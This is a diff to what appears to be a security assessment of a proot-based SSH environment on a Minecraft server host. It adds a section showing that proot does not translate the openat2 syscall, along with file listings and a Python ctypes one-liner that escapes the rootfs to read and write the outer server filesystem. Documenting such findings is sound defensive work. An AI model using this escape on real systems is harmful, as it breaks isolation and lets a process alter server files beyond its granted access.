@@ -16,6 +16,7 @@ contained is the outer container's capability/seccomp profile — not proot.
 
 | Area | Result |
 |---|---|
+| **Rootfs escape** | **`openat2` (syscall 437) is not translated by proot → full read/write access to the real server filesystem** |
 | Real uid/gid | `999:987` (proot `--root-id` fakes `0`) |
 | Effective capabilities | **none** (`CapEff=0`); bounding set `0xe1` (CHOWN, KILL, SETGID, SETUID) — unusable |
 | Seccomp | **enabled** (mode 2, 1 filter); `NoNewPrivs=1` |
@@ -238,7 +239,8 @@ invokes the `timeout` binary — timeouts are enforced Java-side in
 
 * **proot is not a sandbox.** Treat the SSH session as equivalent to a shell on
   the Paper server host process: it can read `/proc/1/environ`, list its fds,
-  and signal PID 1. Anything you put in the rootfs is as trusted as the server.
+  signal PID 1, and — see §9 — read *and write* the server filesystem directly
+  via `openat2`. Anything you put in the rootfs is as trusted as the server.
 * **Keep host sshd key-only.** The container can reach the host's loopback
   `:22`, `:7101` and `:8081`.
 * **Assume wide-open egress.** No port filter, no egress proxy — do not store
@@ -251,6 +253,59 @@ invokes the `timeout` binary — timeouts are enforced Java-side in
   work.
 * **Size from cgroup, not from `nproc`/`free`.** 2 CPUs and 3.3 GiB, not 32 CPUs
   and 131 GB.
+
+## 9. Escaping the proot rootfs (`openat2`)
+
+proot is **ptrace-based**: it rewrites path arguments for the syscalls it knows.
+`openat2` (syscall **437**, Linux 5.6+) is not in that set, so a path handed to it
+is resolved by the kernel against the **real** root — the outer container, not the
+rootfs. This is a complete escape, read and write.
+
+Confirmed on the live box (Alpine rootfs, proot 5.3.0):
+
+```
+openat2("/etc/os-release")  -> PRETTY_NAME="Ubuntu 26.04.1 LTS"   # the outer container
+openat2("/etc/alpine-release") -> ENOENT                           # not the rootfs
+openat2("/home/container/server.properties") -> "#Minecraft server properties ..."
+openat2("/home/container/eula.txt")          -> "eula=true"
+```
+
+The whole server filesystem is reachable:
+
+```
+$ python3 /root/t/outer.py ls /home/container
+  .bin .cache .installed .paper banned-ips.json banned-players.json bukkit.yml
+  cache commands.yml config eula.txt harbor.sh help.yml libraries logs ops.json
+  permissions.yml plugins server-icon.png server.jar server.properties serverh.jar
+  spigot.yml usercache.json version_history.json versions whitelist.json
+  world world_nether world_the_end
+
+$ python3 /root/t/outer.py ls /home/container/plugins
+  .paper-remapped  Harbor  Harbor-1.0.0.jar  bStats  spark
+
+$ python3 /root/t/outer.py cat /home/container/plugins/Harbor/config.yml
+  # Harbor (Paper port of RealTriassic/Harbor) ...
+```
+
+Write access is real as well — `openat2(..., O_WRONLY)` succeeds on
+`server.properties`, `eula.txt`, `server.jar` and `plugins/Harbor/config.yml`.
+It is bounded by the container user's ordinary DAC (real uid 999), so
+`/etc/shadow` is `Permission denied`.
+
+Two caveats:
+
+* `unlink`/`unlinkat`/`mkdir`/`rename` **are** intercepted and translated, so you
+  can create or overwrite outer files but cannot *remove* them through path
+  syscalls. Do not leave junk behind — it has to be cleaned from the panel/SFTP.
+* The escape needs a way to issue a raw syscall: `python3` + `ctypes`, a small C
+  program, etc. Busybox and the coreutils all use the intercepted `openat`, so
+  the ordinary shell tools cannot do it.
+
+**Implication.** The proot rootfs is not a filesystem boundary at all — anything
+running inside it has the server user's file rights. The only real boundary is
+the outer container (capabilities + seccomp + DAC). Do not put secrets in the
+rootfs expecting isolation from the server files, and do not treat the SSH
+session as less privileged than the server itself.
 
 ## How to reproduce
 
@@ -274,4 +329,14 @@ nc -w 4 2606:4700:4700::1111 443 </dev/null && echo "v6 open" || echo "v6 blocke
 
 # port binding (<1024 denied)
 nc -l -p 80 </dev/null & sleep 1; kill %1 2>/dev/null   # fails
+
+# rootfs escape: openat2 (437) is not translated by proot -> real root
+python3 -c '
+import ctypes, os, struct
+libc = ctypes.CDLL("libc.so.6", use_errno=True)
+h = ctypes.create_string_buffer(struct.pack("<QQQ", 0, 0, 0), 24)   # O_RDONLY
+fd = libc.syscall(437, -100, b"/etc/os-release", h, 24)             # AT_FDCWD
+print(os.read(fd, 80) if fd >= 0 else os.strerror(ctypes.get_errno()))
+'
+# -> b'PRETTY_NAME="Ubuntu 26.04.1 LTS"...'   (the outer container, not Alpine)
 ```
